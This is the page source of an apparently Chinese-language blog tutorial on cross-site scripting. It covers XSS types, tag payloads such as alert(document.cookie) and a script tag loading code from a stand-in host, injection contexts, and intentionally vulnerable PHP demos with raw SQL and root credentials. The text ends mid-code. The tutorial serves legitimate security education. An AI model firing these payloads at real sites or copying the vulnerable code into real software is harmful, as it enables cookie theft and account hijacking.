@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <script data-ad-client="ca-pub-2488174175014870" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> <!-- google ad -->
+    <meta name="google-site-verification" content="40lMg4eqLLbXoDcpN3h-cEnfmselbQ8tUzNvuC0IRIs" /><!-- google 站点认证 -->
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="博主用来记录和分享一些日常学到的知识">
+    <meta name="keyword"  content="hexo, java，python">
+    <link rel="shortcut icon" href="/img/hexo/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          漏洞之 XSS(Cross Site Scripting，跨站脚本攻击) - Python技术分享
+        
+    </title>
+
+    <link rel="canonical" href="https://flepeng.github.io/081-security-漏洞-漏洞之-XSS-Cross-Site-Scripting，跨站脚本攻击/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('/img/header_img/archive-bg.jpg')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/hexo/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#security" title="security">security</a>
+                            
+                        </div>
+                        <h1>漏洞之 XSS(Cross Site Scripting，跨站脚本攻击)</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Lepeng on
+                            2021-03-08
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">5.7k</span> and
+                                Reading Time <span class="post-count">24</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Lepeng</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                    <li>
+                        <a href="http://flepeng.com" target="_blank">chinese_blog</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="1、XSS的原理和分类"><a href="#1、XSS的原理和分类" class="headerlink" title="1、XSS的原理和分类"></a>1、XSS的原理和分类</h1><p>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
+<p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
+<p>XSS分为：存储型 、反射型 、DOM型XSS</p>
+<p><img src="/img/security/xss/sso2.png"><br><img src="/img/security/xss/20190115094820160.png"></p>
+<ul>
+<li><p>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie  </p>
+</li>
+<li><p>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。  </p>
+</li>
+<li><p>DOM型XSS：不经过后端，DOM-XSS 漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。<br>可能触发DOM型XSS的属性 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.referer</span><br><span class="line">window.name</span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">documen.write</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。</p>
+<p><img src="/img/security/xss/20181003174457528.png"></p>
+<h1 id="2、XSS的攻击载荷"><a href="#2、XSS的攻击载荷" class="headerlink" title="2、XSS的攻击载荷"></a>2、XSS的攻击载荷</h1><p>以下所有标签的 <code>&gt;</code> 都可以用 <code>//</code> 代替，例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p>
+<p><strong><script>标签</strong>：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(&#x2F;hack&#x2F;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;      #弹出cookie</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #引用外部的xss</span><br></pre></td></tr></table></figure>
+
+<p><strong>svg标签</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload&#x3D;&quot;alert(1)&quot;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><strong><img>标签：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(document.cookie)&gt;  #弹出cookie</span><br></pre></td></tr></table></figure>
+
+<p><strong><body>标签：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body onpageshow&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>video标签:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video onloadstart&#x3D;alert(1) src&#x3D;&quot;&#x2F;media&#x2F;hack-the-planet.mp4&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>style标签：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style onload&#x3D;alert(1)&gt;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="3、XSS可以插在哪里"><a href="#3、XSS可以插在哪里" class="headerlink" title="3、XSS可以插在哪里"></a>3、XSS可以插在哪里</h1><ul>
+<li>用户输入作为script标签内容</li>
+<li>用户输入作为HTML注释内容</li>
+<li>用户输入作为HTML标签的属性名</li>
+<li>用户输入作为HTML标签的属性值</li>
+<li>用户输入作为HTML标签的名字</li>
+<li>直接插入到CSS里</li>
+<li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;!-- 用户输入 --&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;&lt;!-- --&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div 用户输入&#x3D;&quot;xx&quot;&gt;  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;div &gt;&lt;&#x2F;div&gt;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;&lt;div a&#x3D;&quot;xx&quot;&gt; &lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div id&#x3D;&quot;用户输入&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;&quot;&gt;&lt;&#x2F;div&gt;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;&lt;div a&#x3D;&quot;x&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id&#x3D;&quot;xx&quot; &#x2F;&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;&lt;b id&#x3D;&quot;xx&quot; &#x2F;&gt;</span><br><span class="line"> </span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;style&gt;用户输入&lt;style&gt;</span><br><span class="line">&lt;style&gt; &lt;&#x2F;style&gt;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;&lt;style&gt; &lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="4、XSS漏洞的挖掘"><a href="#4、XSS漏洞的挖掘" class="headerlink" title="4、XSS漏洞的挖掘"></a>4、XSS漏洞的挖掘</h1><p><strong>黑盒测试</strong></p>
+<p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
+<ul>
+<li>URL的每一个参数</li>
+<li>URL本身</li>
+<li>表单</li>
+<li>搜索框</li>
+</ul>
+<p><strong>常见业务场景</strong></p>
+<ul>
+<li>重灾区：评论区、留言区、个人信息、订单信息等</li>
+<li>针对型：站内信、网页即时通讯、私信、意见反馈</li>
+<li>存在风险：搜索框、当前目录、图片属性等</li>
+</ul>
+<p><strong>白盒测试(代码审计)</strong></p>
+<p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p>
+<p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>
+<p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
+<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
+<p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p>
+<h1 id="5、XSS的攻击过程"><a href="#5、XSS的攻击过程" class="headerlink" title="5、XSS的攻击过程"></a>5、XSS的攻击过程</h1><p>反射型XSS漏洞：</p>
+<ol>
+<li>Alice 经常浏览某个网站，此网站为 Bob 所拥有。Bob 的站点需要 Alice 使用用户名/密码进行登录，并存储了 Alice 敏感信息(比如银行帐户信息)。</li>
+<li>Tom 发现 Bob 的站点存在反射性的 XSS漏洞</li>
+<li>Tom 利用 Bob 网站的反射型 XSS漏洞 编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击</li>
+<li>Alice 在登录到 Bob 的站点后，浏览了 Tom 提供的恶意链接</li>
+<li>嵌入到恶意链接中的恶意脚本在 Alice 的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在 Alice 完全不知情的情况下将这些信息发送给 Tom。</li>
+<li>Tom 利用获取到的 cookie 就可以以 Alice 的身份登录 Bob 的站点，如果脚本的功更强大的话，Tom 还可以对 Alice 的浏览器做控制并进一步利用漏洞控制。</li>
+</ol>
+<p>存储型XSS漏洞：</p>
+<ol>
+<li>Bob 拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。</li>
+<li>Tom 检测到 Bob 的站点存在存储型的XSS漏洞。</li>
+<li>Tom 在 Bob 的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了 Bob 的服务器的数据库中，然后吸引其它用户来阅读该热点信息。</li>
+<li>Bob 或者是任何的其他人如 Alice 浏览该信息之后,Tom 的恶意脚本就会执行。</li>
+<li>Tom 的恶意脚本执行后，Tom 就可以对浏览器该页面的用户发动一起XSS攻击</li>
+</ol>
+<h1 id="6、XSS漏洞的危害"><a href="#6、XSS漏洞的危害" class="headerlink" title="6、XSS漏洞的危害"></a>6、XSS漏洞的危害</h1><p>从以上我们可以知道，存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。</p>
+<p>那么，利用XSS漏洞可以干什么呢？</p>
+<p><img src="/img/security/xss/20190115095422260.png"></p>
+<p>如果我们的JS水平一般的话，我们可以利用网上免费的XSS平台来构造代码实施攻击。</p>
+<h1 id="7、XSS漏洞的简单攻击测试"><a href="#7、XSS漏洞的简单攻击测试" class="headerlink" title="7、XSS漏洞的简单攻击测试"></a>7、XSS漏洞的简单攻击测试</h1><h3 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h3><p>先放出源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"action.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">//后端 action.php：</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $name=$_POST[<span class="string">"name"</span>]; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $name;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理</p>
+<p><img src="/img/security/xss/20180909075343238.png"></p>
+<p>所以，我们可以在输入框中提交数据：<code>&lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt;</code>，看看会有什么反应</p>
+<p><img src="/img/security/xss/20180908094134553.png"></p>
+<p>页面直接弹出了hack的页面，可以看到，我们插入的语句已经被页面给执行了。这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： 前端-->后端-->前端</p>
+<h3 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h3><p>先给出源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//前端：2.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>存储型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"action2.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        输入你的ID：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        输入你的Name：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">//后端：action2.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  $id=$_POST[<span class="string">"id"</span>];</span></span><br><span class="line"><span class="php">  $name=$_POST[<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php">  mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span></span><br><span class="line"><span class="php">  mysql_select_db(<span class="string">"test"</span>);</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  $sql=<span class="string">"insert into xss value ($id,'$name')"</span>;</span></span><br><span class="line"><span class="php">  $result=mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">//供其他用户访问页面：show2.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span></span><br><span class="line"><span class="php">  mysql_select_db(<span class="string">"test"</span>);</span></span><br><span class="line"><span class="php">  $sql=<span class="string">"select * from xss where id=1"</span>;</span></span><br><span class="line"><span class="php">  $result=mysql_query($sql);</span></span><br><span class="line"><span class="php">  <span class="keyword">while</span>($row=mysql_fetch_array($result))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $row[<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里有一个用户提交的页面，数据提交给后端之后，后端存储在数据库中。然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了。</p>
+<p><img src="/img/security/xss/20180909075606886.png"></p>
+<p>我们输入 1 和 <code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code>，注意，这里的hack的单引号要进行转义，因为sql语句中的$name是单引号的，所以这里不转义的话就会闭合sql语句中的单引号。不然注入不进去。提交了之后，我们看看数据库</p>
+<p><img src="/img/security/xss/20180908102257643.png"></p>
+<p>可以看到，我们的XSS语句已经插入到数据库中了。然后当其他用户访问 show2.php 页面时，我们插入的XSS代码就执行了。  </p>
+<p>存储型XSS的数据流向是：<code>前端--&gt;后端--&gt;数据库--&gt;后端--&gt;前端</code></p>
+<p><img src="/img/security/xss/20180908102309350.png"></p>
+<h3 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a>DOM型XSS：</h3><p>先放上源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 前端3.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"action3.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">// 后端action3.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  $name=$_POST[<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $name; ?&gt;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"print"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> text=<span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> print=<span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line"><span class="actionscript"> 